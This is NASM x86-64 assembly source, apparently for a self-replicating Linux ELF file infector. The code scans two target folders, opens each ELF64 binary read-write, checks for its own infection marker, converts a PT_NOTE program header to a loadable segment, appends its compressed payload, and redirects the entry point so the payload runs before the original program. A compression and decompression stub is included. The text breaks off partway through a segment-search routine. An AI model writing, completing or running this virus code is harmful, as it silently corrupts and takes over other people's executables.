%define SYS_WRITE 1
%define SYS_OPEN 2
%define SYS_CLOSE 3
%define SYS_EXIT 60
%define SYS_GETDENTS64 217
%define SYS_FSTAT 5
%define SYS_MMAP 9
%define SYS_MUNMAP 11
%define SYS_FTRUNCATE 77

%define O_RDONLY 0o
%define O_RDWR 0o2

%define	PROT_READ			0x1
%define	PROT_WRITE			0x2
%define	MAP_SHARED 			0x01
%define	MAP_PRIVATE			0x02
%define	MAP_FIXED			0x10
%define	MAP_ANONYMOUS			0x20
%define	MMAP_ERRORS			-4095

%define BUFFER_SIZE 1024
%define PATH_MAX 4096
; 64 bytes header + 56 bytes for one program header + 1000 bytes for a load segment
%define MINIMAL_FILE_SIZE 64 + 56 + 1000

%define PAGE_SIZE 		0x1000
%define OFFSET_FROM_PAGE_MASK 	0xFFF

global _start

struc linux_dirent64
	.d_ino		resq	1
	.d_off		resq	1
	.d_reclen	resw	1
	.d_type		resb	1
	.d_name		resq	1
endstruc

struc	stat
	.st_dev		resq	1	; ID of device containing file
	.__pad1		resw	1	; Padding
	.st_ino		resq	1	; Inode number
	.st_mode	resd	1	; File type and mode
	.st_nlink	resq	1	; Number of hard links
	.st_uid		resd	1	; User ID of owner
	.st_gid		resd	1	; Group ID of owner
	.st_rdev	resq	1	; Device ID (if special file)
	.__pad2		resw	1	; Padding
	.st_size	resq	1	; Total size, in bytes
	.st_blksize	resq	1	; Block size for filesystem I/O
	.st_blocks	resq	1	; Number of 512B blocks allocated
	.st_atim	resq	2	; Time of last access
	.st_mtim	resq	2	; Time of last modification
	.st_ctim	resq	2	; Time of last status change
	.__unused	resq	3	; Unused
endstruc

struc	elf64_hdr
	.e_ident:	resb	16
	.e_type:	resw	1
	.e_machine:	resw	1
	.e_version:	resd	1
	.e_entry:	resq	1
	.e_phoff:	resq	1
	.e_shoff:	resq	1
	.e_flags:	resd	1
	.e_ehsize:	resw	1
	.e_phentsize:	resw	1
	.e_phnum:	resw	1
	.e_shentsize:	resw	1
	.e_shnum:	resw	1
	.e_shstrndx:	resw	1
endstruc

struc	elf64_phdr
	.p_type:	resd	1
	.p_flags:	resd	1
	.p_offset:	resq	1
	.p_vaddr:	resq	1
	.p_paddr:	resq	1
	.p_filesz:	resq	1
	.p_memsz:	resq	1
	.p_align:	resq	1
endstruc

%define PT_LOAD 1
%define PT_NOTE 4
%define PF_X 0x1
%define PF_W 0x2
%define PF_R 0x4
; used to check if the file has been infected
%define PF_FAMINE 0x8

; compression
%define COMPRESSION_TOKEN 127

section .text

_start:
	nop
	; WTF ça bug si on lance avec lldb https://stackoverflow.com/questions/29042713/self-modifying-code-sees-a-0xcc-byte-but-the-debugger-doesnt-show-it
	; TODO See if something is possible ?
compression:
	push rbp
	mov rbp, rsp
	sub rsp, 8
	sub rsp, 10000	; TODO Change this value with the real length of the compressed data (or osef)
	mov rdi, rsp	; DEST BUFFER TODO REMOVE OR CLEAN

	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local i_src:qword
	%local i_dest:qword
	%local i_haystack:qword
	%local i_haystack_limit:qword
	%local i_needle:qword
	%local best_offset_subbyte:qword
	%local best_len_subbyte:qword
	%local src_end_ptr:qword
	%local dest_end_ptr:qword
	%local len_subbyte:qword

	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	lea rax, [rel _end_payload - 1]
	mov [src_end_ptr], rax
	lea rax, [rdi + 10000 - 1]	; DEST BUFFER TODO REMOVE OR CLEAN
	mov [dest_end_ptr], rax

	mov qword [i_src], 0			; i_src = 0;
	mov qword [i_dest], 0			; i_dest = 0;

.begin_compression:				; while (i_src < payload_length) {
	cmp qword [i_src], _end_payload - _begin_compressed_data	; ...
	mov rax, _end_payload - _begin_compressed_data ; TODO JUST FOR DEBUG
	jge .end_compression			; ...
	xor rdi, rdi				; _i_haystack_limit = 0;
	mov rax, [i_src]			; if (i_src > 255) {
	sub rax, 255				; ...
	cmp qword [i_src], 255			; ...
	cmova rdi, rax				; 	_i_haystack_limit = i_src - 255; }
	mov [i_haystack_limit], rdi		; i_haystack_limit = _i_haystack_limit;
	mov qword [best_len_subbyte], 0		; best_len_subbyte = 0;

.begin_lookup_haystack:				; while (i_haystack_limit < i_src) {
	mov rax, [i_haystack_limit]		; ...
	cmp rax, [i_src]			; ...
	jge .end_lookup_haystack		; ...

	mov [i_haystack], rax			; i_haystack = i_haystack_limit;
	mov qword [len_subbyte], 0		; len_subbyte = 0;
	mov rax, [i_src]			; i_needle = i_src;
	mov qword [i_needle], rax		; ...
	
.begin_lookup_needle:				; while (i_haystack < i_src
	; TODO Check if i_src dépasse pas la taille max de la source aussi
	mov rax, [i_haystack]			; ...
	cmp rax, [i_src]			; ...
	jge .end_lookup_needle			; ...

	mov r10, [src_end_ptr] ; TODO TMP JUST FOR DEBUG
	mov r11, [i_haystack] ; TODO TMP JUST FOR DEBUG
	mov rax, [src_end_ptr]			; 	&& src_end_ptr[-i_haystack] != src_end_ptr[-i_needle]) {
	sub rax, [i_haystack]			; ...
	mov r8b, [rax]				; ...
	mov rax, [src_end_ptr]			; ...
	sub rax, [i_needle]			; ...
	mov r9b, [rax]				; ...
	cmp r8b, r9b				; ...
	jne .end_lookup_needle			; ...

	inc qword [len_subbyte]			; i_len_subbyte++;
	inc qword [i_haystack]			; i_haystack++;
	inc qword [i_needle]			; i_needle++;
	jmp .begin_lookup_needle		; }

.end_lookup_needle:

	mov rax, [len_subbyte]			; if (len_subbyte > best_len_subbyte) {
	mov rdi, [i_src]			; ...
	sub rdi, [i_haystack_limit]		; ...
	mov r8, [best_len_subbyte]		; 
	mov r9, [best_offset_subbyte]
	cmp rax, [best_len_subbyte]		; ...
	cmova r8, rax				; 	best_len_subbyte = len_subbyte;
	cmova r9, rdi				; 	best_offset_subbyte = i_src - i_haystack;
	mov [best_len_subbyte], r8
	mov [best_offset_subbyte], r9
						; }
	inc qword [i_haystack_limit]		; i_haystack_limit++;
	jmp .begin_lookup_haystack		; }

.end_lookup_haystack:

	cmp qword [best_len_subbyte], 3		; if (best_len_subbyte > 3) //length of a token
	jg .write_token				; ...
	jmp .write_byte				; ...

.write_token:					; {
	; TODO Fix size of variables, play with byte/qword, it is ugly
	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
	mov byte [rax], COMPRESSION_TOKEN	; 	*_cur_dest_ptr = COMPRESSION_TOKEN;
	dec rax					; 	_cur_dest_ptr--;
	mov rdi, [best_offset_subbyte]		; 	*_cur_dest_ptr = best_offset_subbyte;
	mov byte [rax], dil			; 	...
	dec rax					; 	_cur_dest_ptr--;
	mov rdi, [best_len_subbyte]		; 	*_cur_dest_ptr = best_len_subbyte;
	mov byte [rax], dil			; 	...
	add qword [i_dest], 3			;	i_dest += 3;
	add [i_src], rdi			;	i_src += best_len_subbyte;
	jmp .end_write_byte_or_token		; }
	
.write_byte:					; else if (*src_end_ptr != COMPRESSION_TOKEN) {
	mov rsi, [src_end_ptr]			; 	...
	sub rsi, [i_src]			; 	...
	cmp byte [rsi], COMPRESSION_TOKEN	; 	...
	je .write_token_byte			; 	...
	mov rdi, [dest_end_ptr]			; 	dest_end_ptr[-i_dest] = src_end_ptr[-i_src];
	sub rdi, [i_dest]			; 	...
	movsb					; 	...
	inc qword [i_dest]			; 	i_dest++;
	inc qword [i_src]			; 	i_src++;
	jmp .end_write_byte_or_token		; }

.write_token_byte:				; else {
	mov rax, [dest_end_ptr]			; 	_cur_dest_ptr = dest_end_ptr;
	sub rax, [i_dest]			; 	_cur_dest_ptr -= i_dest;
	mov byte [rax], COMPRESSION_TOKEN	;	*_cur_dest_ptr = COMPRESSION_TOKEN;
	dec rax					; 	_cur_dest_ptr--;
	mov byte [rax], 0			; 	*_cur_dest_ptr = 0;
	add qword [i_dest], 2
	inc qword [i_src]
.end_write_byte_or_token:			; }
	jmp .begin_compression			; }

.end_compression:
	mov rax, [i_dest]
	add rsp, %$localsize
	pop rbp
	%pop
	mov [rbp - 8], rax	; Size of compressed data
	jmp _begin_real_code	; TODO Good?

_begin_payload:
	; Faut que je me mette en tête la structure du programme infecté
	; Au tout début, on a cette partie là, le pre_payload qui va décompresser
	; Il va falloir qu'on trouve où est la fin de la data (vu qu'on décompresse à l'envers)
	; Faut qu'on connaisse la taille aussi
	; Une fois que c'est fait, va falloir jump sur le payload décompressé pour venir exécuter tout le code
	; On peut faire un truc qui ressemble à ça :
	; -- Structure --
	; Allocation d'espace sur la stack + copie du payload compressé
	; Décompresseur
	; Data intéressante
	; Zone compressée

	push rbp
	mov rbp, rsp
	sub rsp, 8	; 
	sub rsp, 10000	; TODO Change this value with the real length of the compressed data (or osef)

	; save all registers
	push rax
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r8
	push r9
	push r10
	push r11

	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local src_end_ptr:qword
	%local dest_end_ptr:qword

	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	lea rsi, [rel _begin_compressed_data]
	add rsi, [rel compressed_data_size2]
	dec rsi
	lea rdi, [rbp - 8 - 10000]	; TODO Change this value with the real length of the compressed data (or osef)
	add rdi, [rel compressed_data_size2]
	dec rdi
	mov rcx, [rel compressed_data_size2]

	std
	rep movsb
	cld

	lea rax, [rel _begin_compressed_data]
	add rax, [rel compressed_data_size2]
	dec rax
	mov [src_end_ptr], rax ; TODO Change variable
	lea rax, [rel _end_payload - 1]
	mov [dest_end_ptr], rax ; TODO Change variable

	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
.decompression_routine:
	lea rax, [rel _begin_compressed_data]
	dec rax
	cmp [src_end_ptr], rax
	je .end_decompression_routine

	mov rsi, [src_end_ptr]
	mov r8b, [rsi]
	cmp r8b, COMPRESSION_TOKEN
	je .decompress_token
	mov rdi, [dest_end_ptr]
	mov [rdi], r8b
	dec qword [src_end_ptr]
	dec qword [dest_end_ptr]
	jmp .decompression_routine
.decompress_token:
	mov rax, [src_end_ptr]
	sub rax, 1
	cmp byte [rax], 0
	je .decompress_byte_token
	xor rsi, rsi
	mov sil, [rax]
	add rsi, [dest_end_ptr]
	mov rdi, [dest_end_ptr]

	xor rcx, rcx
	sub rax, 1
	mov cl, [rax]

	std
	rep movsb
	cld

	sub qword [src_end_ptr], 3

	mov cl, [rax]
	sub [dest_end_ptr], rcx

	jmp .decompression_routine

.decompress_byte_token:
	mov rdi, [dest_end_ptr]
	mov byte [rdi], COMPRESSION_TOKEN
	dec qword [dest_end_ptr]
	sub qword [src_end_ptr], 2
	jmp .decompression_routine

.end_decompression_routine:
	add rsp, %$localsize
	pop rbp
	%pop

	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG
	nop ; TODO TEMP FOR DEBUG

	; restore all registers
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
	pop rax

	jmp _begin_real_code

_jmp_instr:
	db 0xe9, 00, 00, 00, 00				; jump to default behavior of infected file
							; or to next instruction if original virus
	jmp exit
compressed_data_size2: dq 0x00
_begin_real_code:
_begin_compressed_data:
	; save all registers
	push rax
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r8
	push r9
	push r10
	push r11

	lea rdi, [rel infected_folder_1]		; treate_folder(infected_folder_1); ; TODO FILL PARAMS
	mov rsi, [rbp - 8]				; ...
	lea rdx, [rbp - 8 - 10000]			; ...
	add rdx, 10000 ; UGLY THING BECAUSE OF ARBITRARY -10000
	sub rdx, rsi
	call treate_folder				; ...
	lea rdi, [rel infected_folder_2]		; treate_folder(infected_folder_2); TODO FILL PARAMS
	call treate_folder				; ...

	; restore all registers
	pop r11
	pop r10
	pop r9
	pop r8
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
	pop rax

	mov rsp, rbp
	pop rbp

	jmp _jmp_instr

exit:
	mov rax, SYS_EXIT				; exit(
	xor rdi, rdi					; 0
	syscall						; );

; TODO FILL PARAMS
; void treate_folder(char const *_folder);
; void treate_folder(rdi folder);
treate_folder:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local folder:qword				; char const *folder;
	%local fd:qword					; long fd;
	%local cur_offset:qword				; long cur_offset;
	%local read_bytes:qword				; long read_bytes;
	%local cur_dirent:qword				; void *cur_dirent;
	%local compressed_data_size:qword		; long compressed_data_size;
	%local compressed_data_ptr:qword		; uint8_t *compressed_data_ptr;
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [folder], rdi				; folder = _folder;
	mov [compressed_data_size], rsi			; compressed_data_size = _compressed_data_size;
	mov [compressed_data_ptr], rdx			; compressed_data_ptr = _compressed_data_ptr;

	; Open folder
	mov rax, SYS_OPEN				; _ret = open(
	mov rdi, [folder]				; folder_name,
	mov rsi, O_RDONLY				; O_RDONLY,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

.begin_getdents_loop:					; while (true) {
	mov rax, SYS_GETDENTS64				; _ret = SYS_GETDENTS64(
	mov rdi, [fd]					; 	fd,
	lea rsi, [buf]					; 	buf,
	mov rdx, BUFFER_SIZE				; 	BUFFER_SIZE
	syscall						; );

	cmp rax, 0					; if (_ret <= 0)
	jle .end_getdents_loop				;	 break;
	mov [read_bytes], rax				; read_bytes = _ret;

	xor rax, rax					; cur_offset = 0;
	mov [cur_offset], rax				; ...

.begin_treate_loop:					; do {
	lea rax, [buf]					; cur_dirent = buf + cur_offset;
	add rax, [cur_offset]				; ...
	mov [cur_dirent], rax				; ...

	mov rdi, [folder]				; treat_file(folder;
	mov rsi, [cur_dirent]				; 	cur_dirent
	add rsi, linux_dirent64.d_name			; 		->d_name
	mov rdx, [compressed_data_size] ; TODO FILL PARAMS
	mov rcx, [compressed_data_ptr]
	call treat_file					; );

	mov rax, [cur_dirent]				; _reclen_ptr = cur_dirent->d_reclen;
	add rax, linux_dirent64.d_reclen		; ...
	xor rdi, rdi					; _reclen = *_reclen_ptr;
	mov di, [rax]					; ...
	add [cur_offset], rdi				; cur_offset += _reclen;

	mov rax, [cur_offset]				; } while (cur_offset == read_bytes);
	cmp rax, [read_bytes]				; ...
	je .end_treate_loop				; ...
	jmp .begin_treate_loop				; ...
.end_treate_loop:					; ...

	jmp .begin_getdents_loop
.end_getdents_loop:					; }

	; Close folder
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; TODO FILL PARAMS
; void treat_file(char const *_dirname, char const *_filename);
; void treat_file(rdi dirname, rsi filename);
treat_file:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local dirname:qword				; char const *dirname;
	%local filename:qword				; char const *file;
	%local filepath:qword				; char *filepath;
	%local fd:qword					; long fd;
	%local filesize:qword				; long filesize;
	%local mappedfile:qword				; void *mappedfile;
	%local payload_offset:qword			; long payload_offset;
	%local new_vaddr:qword				; Elf64_addr new_vaddr;
	%local payload_size:qword			; long payload_size;
	%local offset_to_sub_mmap:qword			; long offset_to_sub_mmap;
	%local compressed_data_size:qword		; long compressed_data_size;
	%local compressed_data_ptr:qword		; long compressed_data_ptr;
	%xdefine pathbuf rbp - %$localsize - PATH_MAX	; uint8_t pathbuf[PATH_MAX];
	%assign %$localsize %$localsize + PATH_MAX	; ...
	%xdefine buf rbp - %$localsize - BUFFER_SIZE	; uint8_t buf[BUFFER_SIZE];
	%assign %$localsize %$localsize + BUFFER_SIZE	; ...

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [dirname], rdi				; dirname = _dirname;
	mov [filename], rsi				; filename = _filename;
	mov [compressed_data_size], rdx			; compressed_data_size = _compressed_data_size;
	mov [compressed_data_ptr], rcx			; compressed_data_ptr = _compressed_data_ptr;

	xor r8, r8					; len = 0;
	lea rdi, [pathbuf]				; dest = pathbuf;
	mov rsi, [dirname]				; src = dirname;
	.dirname:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .dirname				; 	goto .dirname;

	mov rsi, [filename]				; src = filename;
	.filename:
		inc r8					; len++;
		cmp r8, PATH_MAX			; if (len == PATH_MAX)
		je .end					; 	goto .end;
		movsb					; *dest++ = *src++;
		cmp byte [rsi], 0			; if (*src != 0)
		jnz .filename				; 	goto .filename;
	
	mov byte [rdi], 0				; *dest = 0;
	

	; Open file
	mov rax, SYS_OPEN				; _ret = open(
	lea rdi, [pathbuf]				; path,
	mov rsi, O_RDWR					; O_RDWR,
	xor rdx, rdx					; 0
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .end						; 	goto .end
	mov [fd], rax					; fd = _ret;

	; Get file stat
	lea rsi, [buf]					; _stat = buf;
	mov rax, SYS_FSTAT				; _ret = fstat(
	mov rdi, [fd]					; 	fd,
	syscall						; _stat);
	cmp rax, -1					; if (_ret == -1)
	je .close_file					; 	goto .close_file

	add rsi, stat.st_size				; filesize = _stat->st_size;
	mov rax, [rsi]					; ...
	mov [filesize], rax				; ...
	cmp rax, MINIMAL_FILE_SIZE			; if (filesize < MINIMAL_FILE_SIZE)
	jl .close_file					; 	goto .close_file

	; Reserve file size + payload size (for PT_NOTE method)
	mov rax, SYS_MMAP				; _ret = mmap(
	xor rdi, rdi					; 	0,
	mov rsi, [filesize]				; 	filesize + (_end_payload - _begin_payload),
	add rsi, _end_payload - _begin_payload		;	...
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_PRIVATE | MAP_ANONYMOUS		; 	MAP_PRIVATE | MAP_ANONYMOUS,
	mov r8, -1					; 	-1,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Map file
	mov rax, SYS_MMAP				; _ret = mmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize,
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	xor r9, r9					; 	0
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .close_file					; 	goto .close_file
	mov [mappedfile], rax				; mappedfile = _ret;

	; Check if file is an ELF 64
	mov rdi, [mappedfile]				; is_elf_64(mappedfile);
	call is_elf_64					; ...
	cmp rax, 1					; if (is_elf_64(mappedfile) != 1)
	jne .unmap_file					; 	goto .unmap_file

	; Check if file has a signature
	mov rdi, [mappedfile]				; if (has_signature(mappedfile) == 1)
	call has_signature				; ...
	cmp rax, 1					; ...
	je .unmap_file					; 	goto .unmap_file

	mov rax, [filesize]				; payload_offset = filesize;
	mov [payload_offset], rax			; ...
	mov rdi, [mappedfile]				; _new_vaddr = get_next_available_vaddr(mappedfile);
	call get_next_available_vaddr			; ...

	; Align new_vaddr to offset in file such as offset = vaddr % PAGE_SIZE
	mov rdi, [payload_offset]			; _offset_from_page = payload_offset;
	and rdi, OFFSET_FROM_PAGE_MASK			; _offset_from_page &= OFFSET_FROM_PAGE_MASK
	add rax, rdi					; _injected_segment_start += _offset_from_page;
	mov [new_vaddr], rax				; new_vaddr = _new_vaddr;

	mov rdi, _end_payload - _begin_payload		; payload_size = _end_payload - _begin_payload;
	mov [payload_size], rdi				; ...

	; TODO rcx peut être différent de r8 si on fait de la compression
	mov rdi, [mappedfile]				; convert_pt_note_to_load(mappedfile,
	mov rsi, [payload_offset]			; payload_offset,
	mov rdx, [new_vaddr]				; next_vaddr,
	mov rcx, [compressed_data_size]			; compressed_data_size,
	add rcx, _begin_compressed_data - _begin_payload ; TODO Comment
	mov r8, [payload_size]				; payload_size,
	call convert_pt_note_to_load			; );

	mov rax, SYS_FTRUNCATE				; _ret = ftruncate(
	mov rdi, [fd]					; fd,
	mov rsi, [filesize]				; filesize
	add rsi, [compressed_data_size]			; + payload_size ; TODO Comment
	add rsi, _begin_compressed_data - _begin_payload ; TODO Comment
	syscall						; );
	cmp rax, 0					; if (_ret < 0)
	jl .unmap_file					; 	goto .unmap_file

	; Get address of the start of the current page
	; TODO Do something about old_filesize but we use [filesize]
	xor rdx, rdx					; _offset = old_filesize / page_size
	mov rax, [filesize]				; ...
	mov rdi, PAGE_SIZE				; ...
	div rdi						; ...
	mul rdi						; _offset *= page_size;
	mov [offset_to_sub_mmap], rax			; offset_to_sub_mmap = _offset;
	mov rdi, [mappedfile]				; _addr = mapped_file
	add rdi, rax					; _addr += _offset

	mov rax, SYS_MMAP				; _ret = mmap(
							;	_addr,
	mov rsi, [filesize]				; 	filesize
	sub rsi, [offset_to_sub_mmap]			;	  - offset_to_sub_mmap,
	add rsi, [payload_size]				;	  + payload_size
	mov rdx, PROT_READ | PROT_WRITE			; 	PROT_READ | PROT_WRITE,
	mov r10, MAP_SHARED | MAP_FIXED			; 	MAP_SHARED | MAP_FIXED,
	mov r8, [fd]					; 	fd,
	mov r9, [offset_to_sub_mmap]			;	offset_to_sub_mmap
	syscall						; );
	cmp rax, MMAP_ERRORS				; if (_ret == MMAP_ERRORS)
	je .unmap_file					; 	goto .unmap_file

	; TODO Add a noop again to avoid lldb issues with infected
	; copy all bytes between _begin_payload and _begin_compressed_data to the segment
	mov rdi, [mappedfile]				; dest = file_map + filesize;
	add rdi, [filesize]				; ...
	; TODO Fix comments
	lea rsi, [rel _begin_payload]			; src = _begin_payload; //TODO Fuck lldb ; TODO Comment x2
	mov rcx, _begin_compressed_data - _begin_payload			; len = _end_payload - _begin_payload;
	rep movsb					; memcpy(dest, src, len);
	; copy all bytes between _begin_compressed_data and _end_payload to the segment
	mov rdi, [mappedfile]				; dest = file_map + filesize;
	add rdi, [filesize]				; ...
	add rdi, _begin_compressed_data - _begin_payload ; TODO Comment
	; TODO Fix comments
	mov rsi, [compressed_data_ptr]			; src = _begin_payload; //TODO Fuck lldb ; TODO Comment x2
	mov rcx, [compressed_data_size]			; len = _end_payload - _begin_payload;
	rep movsb					; memcpy(dest, src, len);

	; compute jmp_value
	mov rdi, [mappedfile]				; _jmp_value = file_map
	add rdi, elf64_hdr.e_entry			; 	->e_entry;
	mov eax, [rdi]					; ... // TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"

	; TODO "C'est assez petit yolo on s'en fout mais entry est un 64bits"
	sub eax, [new_vaddr]				; _jmp_value -= new_vaddr;	//TODO Precise that new_vaddr = new_entry?
	sub eax, _jmp_instr - _begin_payload		; _jmp_value -= _jmp_instr - _begin_payload;
	sub eax, 5					; _jmp_value -= 5; // Size of jmp instruction

	; change jmp_value in injected code
	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + filesize + (_end_payload - _begin_payload) - 8 (8 is the size of the jmp_value variable);
	add rdi, [filesize]				; 	+ filesize
	add rdi, _jmp_instr - _begin_payload		; 	+ (_jmp_inst - _begin_payload)
	inc rdi						; 	+ 1;
	mov [rdi], eax					; *jmp_value_ptr = _jmp_value;

	; change compressed_data_size2 in injected code
	; TODO Change comment
	mov rdi, [mappedfile]				; jmp_value_ptr = file_map + filesize + (_end_payload - _begin_payload) - 8 (8 is the size of the jmp_value variable);
	add rdi, [filesize]				; 	+ filesize
	add rdi, compressed_data_size2 - _begin_payload		; 	+ (_jmp_inst - _begin_payload)
	mov rax, [compressed_data_size]
	mov [rdi], rax					; *jmp_value_ptr = _jmp_value;

	; TODO Clean
	; TODO It sets the new entry. It was above before. But need to put this here
	mov rdi, [mappedfile]				; _e_entry = &mappedfile->e_entry;
	add rdi, elf64_hdr.e_entry			; ...
	mov rax, [new_vaddr]				; *_e_entry = new_vaddr;
	mov [rdi], rax					; ...

.unmap_file:
	mov rax, SYS_MUNMAP				; _ret = munmap(
	mov rdi, [mappedfile]				; 	mappedfile,
	mov rsi, [filesize]				; 	filesize
	syscall						; );

.close_file:
	mov rax, SYS_CLOSE				; _ret = close(
	mov rdi, [fd]					;	fd
	syscall						; );

.end:
	add rsp, %$localsize
	pop rbp
	%pop
	ret

; Elf64_Addr get_next_available_vaddr(char const *file_map);
; rax get_next_available_vaddr(rdi file_map);
get_next_available_vaddr:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local furthest_segment_end:qword		; Elf64_Addr furthest_segment_end;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:word				; short e_phentsize;
	%local e_phnum:word				; short e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr->e_phoff;
	mov [e_phoff], rax				; ...
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr->e_phentsize;
	mov [e_phentsize], ax				; ...
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr->e_phnum;
	mov [e_phnum], ax				; ...

	mov QWORD [furthest_segment_end], 0		; furthest_segement_end = 0;

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; do {
		mov rax, [file_map]			; _cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
		imul rcx, rsi				; 		...
		add rax, rcx				; 		...

		mov rdi, rax				; _cur_furthest = _cur_phdr->p_vaddr
		add rdi, elf64_phdr.p_vaddr		; ...
		mov r8, [rdi]				; ...

		mov rdi, rax				; _cur_furthest += _cur_phdr->p_memsz
		add rdi, elf64_phdr.p_memsz		; ...
		add r8, [rdi]				; ...

		mov r9, [furthest_segment_end]		; _furthest_segment_end = furthest_segment_end
		cmp r8, r9				; if (_cur_furthest > _furthest_segment_end)
		cmova r9, r8				;	_furthest_segment_end = _cur_furthest;
		mov [furthest_segment_end], r9		; ...

		inc rsi					; i++;
		cmp si, [e_phnum]			; } while (i != e_phnum);
		jne .begin_phdr_loop			; ...

	; Round up to next multiple of PAGE_SIZE
	mov rax, [furthest_segment_end]			; _next_available_vaddr = furthest_segment_end;
	xor r8, r8					; _offset_to_align = 0
	mov r9, PAGE_SIZE				; _new_offset_to_align = PAGE_SIZE
	test rax, OFFSET_FROM_PAGE_MASK			; if (_furthest_segment_end & OFFSET_FROM_PAGE_MASK == 0)
	cmovnz r8, r9					;	_offset_to_align = _new_offset_to_align
	mov r9, OFFSET_FROM_PAGE_MASK			; _alignment_mask = OFFSET_FROM_PAGE_MASK
	not r9						; _alignment_mask = ~alignement_mask;
	and rax, r9					; _next_available_vaddr &= _alignement_mask;
	add rax, r8					; _next_available_vaddr += _new_offset_to_align;

	add rsp, %$localsize
	pop rbp
	%pop
	ret						; return _next_available_vaddr;
	

; int is_elf_64(char const *file_map);
; rax is_elf_64(rdi file_map);
is_elf_64:
	xor rsi, rsi					; counter = 0;
	.begin_magic_loop:				; while (true) {
		mov al, [rdi + rsi]			; 	_c = file_map[counter];
		lea r8, [rel elf_64_magic]
		mov bl, [r8+rsi]				; 	_magic_c = elf_64_magic[counter];
		cmp al, bl				; 	if (_c != _magic_c)
		jne .end_not_equal			; 		goto end_not_equal;
		inc rsi					; 	counter++;
		cmp rsi, len_elf_64_magic		; 	if (counter == len_elf_64_magic)
		je .end_equal				; 		goto end_equal;
		jmp .begin_magic_loop			; }
	
	.end_not_equal:
		xor rax, rax				; return 0;
		ret

	.end_equal:
		mov rax, 1				; return 1;
		ret

;elf64_phdr *find_note_segment(char const *_file_map)
;rax find_note_segment(rdi file_map);
find_note_segment:
	%push context
	%stacksize flat64
	%assign %$localsize 0

	%local file_map:qword				; char const *file_map;
	%local res_header:qword				; elf64_phdr *res_header;
	%local e_phoff:qword				; long e_phoff;
	%local e_phentsize:qword			; long e_phentsize;
	%local e_phnum:qword				; long e_phnum;

	; Initializes stack frame
	push rbp
	mov rbp, rsp
	sub rsp, %$localsize

	mov [file_map], rdi				; file_map = _file_map;
	mov rax, [rdi + elf64_hdr.e_phoff]		; e_phoff = elf64_hdr.e_phoff;
	mov [e_phoff], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phentsize]		; e_phentsize = elf64_hdr.e_phentsize;
	mov [e_phentsize], rax				; ...
	xor rax, rax
	mov ax, [rdi + elf64_hdr.e_phnum]		; e_phnum = elf64_hdr.e_phnum;
	mov [e_phnum], rax				; ...

	; loop through program headers
	xor rsi, rsi					; i = 0;
	.begin_phdr_loop:				; while (true) {
		mov rax, [file_map]			; cur_phdr = file_map
		add rax, [e_phoff]			; 	+ elf64_hdr.e_phoff
		mov rcx, [e_phentsize]			; 	+ i * elf64_hdr.e_phentsize
